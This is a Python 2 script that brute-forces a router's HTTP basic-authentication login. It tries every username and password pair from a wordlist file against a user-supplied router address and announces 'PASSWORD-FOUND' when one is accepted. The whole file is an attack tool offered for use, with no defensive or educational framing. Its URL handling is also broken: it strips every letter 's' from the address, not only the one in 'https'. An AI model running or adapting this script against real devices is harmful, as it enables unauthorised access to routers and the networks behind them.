import requests, sys, os, re

pattern = r'http'
pat = r's'
url = raw_input('Enter router ip: ')

if re.match(pattern, url):
    url = re.sub(pat,'',url)
    pass
else:
    url = 'http://'+url


def data():
    uzerl = open('list.txt','r')
    paszl = open('list.txt','r')
    uzer = uzerl.read().splitlines()
    pasz = paszl.read().splitlines()
    return uzer, pasz


uzer, pasz = data()

for user in uzer:
    for password in pasz:
        r = requests.get(url,auth=(user,password))
        status = r.status_code
        print "============AL104=============="
        print "code: ",status
        print "User: "+user
        print "Password: "+password
        print "============AL104=============="
        if(status == 200):

            print"[----------------------------------------]"
            print"[============PASSWORD-FOUND==============]"
            print"          status = ",status                    
            print"          User: "+user                       
            print"          Password: "+password
            print"[=================AL104==================]"
            sys.exit()

os.system("clear")
print
print
print("PASSWORD NOT FOUND!!")
print("ERROR!!")
print("user/password may not be on wordlist!!")
print("pls use or create another wordlist")

